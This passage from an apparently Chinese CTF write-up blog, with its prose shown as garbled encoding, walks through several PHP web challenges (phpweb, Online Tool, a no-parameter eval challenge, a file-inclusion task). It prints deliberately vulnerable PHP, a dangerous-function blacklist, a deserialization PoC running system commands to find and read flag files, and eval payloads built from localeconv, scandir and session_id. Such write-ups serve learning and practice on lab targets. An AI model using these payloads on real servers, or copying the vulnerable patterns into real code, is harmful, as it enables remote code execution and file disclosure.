class="keyword">or</span></span><br><span class="line">&#123;<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>èƒ½ä½¿ç”¨é€šé…ç¬¦</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230406193358450.png" alt="image-20230406193358450"></p><p>è¿™é‡Œç»™äº†ä¸ªdate()å‡½æ•°ï¼Œç„¶åä¸‹é¢å°±å‡ºç°ä¸ªæ—¶é—´ï¼Œä½†è¿˜æ˜¯ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p><p>æŠ“ä¸ªåŒ…</p><p><img src="../images/image-20230406193537404.png" alt="image-20230406193537404"></p><p>çœ‹åˆ°äº†è¿™ä¸ªä¸œè¥¿,å°±çŒœæµ‹æ˜¯funcæ˜¯å‡½æ•°ï¼Œpæ˜¯å†…å®¹</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±è¿›è¡Œæµ‹è¯•ä¸€ä¸‹</p><p><img src="../images/image-20230406193705019.png" alt="image-20230406193705019"></p><p>æŠ“å–åˆ°äº†æºç </p><p><strong>æºç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">     <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"> <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯æä¾›çš„è¿™ä¸ªç±»æ‰æ˜¯é‡ç‚¹ï¼Œä¸ä¼šè¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥ç›´æ¥ç”¨è‡ªå·±æƒ³ç”¨çš„å‡½æ•°</p><p>ç„¶åè¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶ååœ¨ç”¨ååºåˆ—åŒ–å‡½æ•°å°†å‘½ä»¤è¿›è¡Œæ‰§è¡Œ</p><p>åºåˆ—åŒ–ä»£ç (åºåˆ—åŒ–ä¹‹åæ³¨æ„å°†ç©ºæ ¼ä¿®æ”¹ä¸º+å·ï¼Œæˆ–è€…é‡‡ç”¨getæ–¹å¼è¿›è¡Œä¼ è¾“ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ååºåˆ—åŒ–å‡½æ•°è¿›è¡Œååºåˆ—åŒ–</p><p><img src="../images/image-20230406194638777.png" alt="image-20230406194638777"></p><p>å®Œæˆç»•è¿‡</p><p>è¿˜æœ‰ä¸€ç§è§£æ³•</p><p><img src="../images/image-20230406194840536.png" alt="image-20230406194840536"></p><p><strong>\systemå¯ä»¥ç»•è¿‡é»‘åå•çš„åŸå› ï¼šphpå†…çš„â€ \ â€œåœ¨åšä»£ç æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šè¯†åˆ«ç‰¹æ®Šå­—ç¬¦ä¸²ã€‚</strong></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>REMOTE_ADDR æ˜¯ä½ çš„å®¢æˆ·ç«¯è·Ÿä½ çš„æœåŠ¡å™¨â€œæ¡æ‰‹â€æ—¶å€™çš„IPã€‚å¦‚æœä½¿ç”¨äº†â€œåŒ¿åä»£ç†â€ï¼ŒREMOTE_ADDRå°†æ˜¾ç¤ºä»£ç†æœåŠ¡å™¨çš„IPã€‚</strong><br>HTTP_CLIENT_IP æ˜¯ä»£ç†æœåŠ¡å™¨å‘é€çš„HTTPå¤´ã€‚å¦‚æœæ˜¯â€œè¶…çº§åŒ¿åä»£ç†â€ï¼Œåˆ™è¿”å›noneå€¼ã€‚åŒæ ·ï¼ŒREMOTE_ADDRä¹Ÿä¼šè¢«æ›¿æ¢ä¸ºè¿™ä¸ªä»£ç†æœåŠ¡å™¨çš„IPã€‚<br><strong>$_SERVER[â€˜REMOTE_ADDRâ€™]; //è®¿é—®ç«¯ï¼ˆæœ‰å¯èƒ½æ˜¯ç”¨æˆ·ï¼Œæœ‰å¯èƒ½æ˜¯ä»£ç†çš„ï¼‰IP</strong>$<strong>_SERVER[â€˜HTTP_CLIENT_IPâ€™]; //ä»£ç†ç«¯çš„ï¼ˆæœ‰å¯èƒ½å­˜åœ¨ï¼Œå¯ä¼ªé€ ï¼‰<br>$_SERVER[â€˜HTTP_X_FORWARDED_FORâ€™]; //ç”¨æˆ·æ˜¯åœ¨å“ªä¸ªIPä½¿ç”¨çš„ä»£ç†ï¼ˆæœ‰å¯èƒ½å­˜åœ¨ï¼Œä¹Ÿå¯ä»¥ä¼ªé€ ï¼‰</strong></p><p><a href="https://www.cnblogs.com/jackluo/archive/2013/03/03/2941411.html">è¿™ç¯‡æ–‡ç« è®²çš„é€å½»</a></p><p><a href="https://paper.seebug.org/164/">escapeshellarg()å’Œescapeshellcmd()</a></p><p>ç›´æ¥æ‰¾åˆ°äº†ä¸Šé¢è¿™ç¯‡æ–‡ç« ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°åœ¨ä¸€èµ·ç”¨ä¼šæœ‰äº›é—®é¢˜</p><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">è¿™ç¯‡wpå†™çš„éå¸¸è¯¦ç»†ï¼Œæˆ‘è¿™é‡Œå°±ä¸å†™äº†</a></p><p>å¯¹äºè¿™äº›è½¬ä¹‰å­—ç¬¦å’Œé‚£ä¸¤ä¸ªå‡½æ•°æ‰§è¡Œçš„è¿‡ç¨‹ï¼Œè®¤çœŸçœ‹çœ‹å°±èƒ½æ˜ç™½äº†</p><p><img src="../images/image-20230406202802386.png" alt="image-20230406202802386"></p><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230406202925322.png" alt="image-20230406202925322"></p><p>æ²¡å•¥ä¸œè¥¿ï¼Œä½†æ˜¯æ‰«ç›®å½•çš„æ—¶å€™å‘ç°äº†</p><p><img src="../images/image-20230406203421874.png" alt="image-20230406203421874"></p><p>è¿™å››ä¸ªgitä¸œè¥¿ï¼Œä½†æ˜¯éƒ½ä¸‹è½½ä¸‹æ¥æ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ä¿¡æ¯ï¼Œç„¶åæˆ‘ä»¬å°±å»çœ‹çœ‹å…¶ç›¸å¯¹åº”çš„å·¥å…·æ¥çœ‹çœ‹èƒ½ä¸èƒ½æ‹¿åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p><p>å°è¯•ä½¿ç”¨ <a href="https://so.csdn.net/so/search?q=GitHack&amp;spm=1001.2101.3001.7020">GitHack</a> çœ‹çœ‹æ˜¯ä¸æ˜¯æºç æ³„éœ²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/GitHack</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406204017689.png" alt="image-20230406204017689"></p><p><img src="../images/image-20230406204033529.png" alt="image-20230406204033529"></p><p><img src="../images/image-20230406204049843.png" alt="image-20230406204049843"></p><p>æ‹¿åˆ°äº†æºç </p><p><strong>æºç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406204529234.png" alt="image-20230406204529234"></p><p>æ‰’ä¸‹äº†ç½‘ç«™çš„æºç <br>å¥½äº†ï¼Œç°åœ¨å°±æ˜¯ä»£ç å®¡è®¡äº†<br>æœ€å¸å¼•çœ¼çƒçš„å°±æ˜¯ evalçš„ä¸€å¥è¯æœ¨é©¬ï¼Œé¢˜ç›®åˆåŠ äº†å¥½å¤šè¿‡æ»¤é™åˆ¶äº†REC<br>é¦–å…ˆæ˜¯ phpä¼ªåè®® dataåè®® filteråè®® éƒ½ä¸èƒ½ä½¿ç”¨äº†<br>ç„¶åè¯¥ç½‘ç«™ä½¿ç”¨äº†æ­£åˆ™åŒ¹é… å…¶å®è¿™å°±æ˜¯æ— å‚æ•°çš„rce</p><p>å¦‚æœå¦‚æœâ€™;â€™===preg<em>replace(â€¦)ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œexpä¼ é€’çš„å‘½ä»¤<br>**(?R)? : (?R)ä»£è¡¨å½“å‰è¡¨è¾¾å¼ï¼Œå°±æ˜¯è¿™ä¸ª(/[a-z,</em>]+((?R)?)/)ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é€’å½’ï¼Œ?è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–1æ¬¡ï¼ˆè‹¥æ˜¯(?R)<em>åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…a(b(c()d()))*</em></p><p><code>if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]))</code>è¿™ä¸ªå°±æ˜¯å¾—è¦æ±‚ä¼ å…¥çš„expå¾—å…¨éƒ¨æ¯åŒ¹é…è¿›è¡Œæ›¿æ¢ï¼Œæ›¿æ¢åªå‰©ä¸‹     <strong>ï¼›</strong>æ‰è¡Œï¼Œå’Œé¢˜ç›®è¯´çš„ä¸€æ ·   â€”-&gt;   <strong>å¥—å¨ƒ</strong></p><p>æ— å‚æ•°REC ä¸€èˆ¬æœ‰ä¸‰ç§ç»•è¿‡å§¿åŠ¿ï¼š</p><ul><li><strong>gettallheadersï¼ˆï¼‰</strong></li><li><strong>get_defined_vars()</strong></li><li><strong>session_id()</strong><br><strong>å…·ä½“å¯ä»¥<a href="https://blog.csdn.net/Manuffer/article/details/120738755">å‚è€ƒåšå®¢</a></strong></li></ul><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºï¼Œæœ¬å‡½æ•°æ˜¯show_source() çš„åˆ«å</span><br><span class="line">next() è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ å’Œä¸‹ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚</span><br><span class="line">array_reverse() å‡½æ•°ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚(ä¸»è¦æ˜¯èƒ½è¿”å›å€¼)</span><br><span class="line">scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</span><br><span class="line">pos() è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</span><br><span class="line">localeconv() å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œè¯¥æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å°±æ˜¯&quot;.&quot;ã€‚</span><br></pre></td></tr></table></figure><p><strong>åŸç†</strong></p><p>loacleconv å‡½æ•°ä¼šå›ºå®šè¿”å›ä¸€ä¸ª . ç„¶åposå°†æˆ‘ä»¬è·å¾—çš„ .è¿”å›åˆ°æˆ‘ä»¬æ„é€ çš„ payload ä½¿å¾— scandirèƒ½å¤Ÿè¿”å›å½“å‰ç›®å½•ä¸‹çš„æ•°ç»„ï¼ˆæ¢å¥è¯è¯´ï¼Œå°±æ˜¯è¯»å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼‰ rray_reverse()ä»¥ç›¸åçš„é¡ºåºè¾“å‡ºï¼ˆç›®çš„æ˜¯ä»¥æ­£åºè¾“å‡ºæŸ¥è¯¢å‡ºæ¥çš„å†…å®¹ï¼‰ç„¶å next æå–ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå°†.è¿‡æ»¤å‡ºå»ï¼‰ï¼Œæœ€åç”¨highlight_file()ç»™æ˜¾ç¤ºå‡ºæ¥ã€‚<br><img src="../images/image-20230406205415420.png" alt="image-20230406205415420"></p><p><strong>æ–¹æ³•äºŒ</strong><br>ä¸Šé¢ çš„æ­£åˆ™è¿‡æ»¤ä¸­ å…¶å®å¹¶æ²¡æœ‰è¿‡æ»¤æ‰ session_id()<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ session_idæ¥è·å– flag<br>session_id() å¯ä»¥ç”¨æ¥è·å–/è®¾ç½® å½“å‰ä¼šè¯ IDã€‚<br>åœ¨æˆ‘ä»¬ä½¿ç”¨ session_id()çš„æ—¶å€™ éœ€è¦ä½¿ç”¨session_start()æ¥å¼€å¯sessionä¼šè¯<br>æˆ‘ä»¬å°è¯•æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file( session_id(session_start()));</span><br></pre></td></tr></table></figure><p>session_id(session_start())<br>ä½¿ç”¨sessionä¹‹å‰éœ€è¦é€šè¿‡session_start()å‘Šè¯‰PHPä½¿ç”¨sessionï¼Œphpé»˜è®¤æ˜¯ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„ã€‚<br>session_id()å¯ä»¥è·å–åˆ°å½“å‰çš„session idã€‚<br><img src="../images/image-20230406205748900.png" alt="image-20230406205748900"></p><p><strong>PHPSESSIDæ¥æ‰¾åˆ°æœåŠ¡ç«¯çš„sessionæ–‡ä»¶ï¼Œé€šè¿‡å¯¹è¿™ä¸ªsessionæ–‡ä»¶çš„è¯»å†™æ“ä½œå³å®ç°äº†sessionçš„è¶…å…¨å±€å˜é‡å±æ€§</strong></p><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 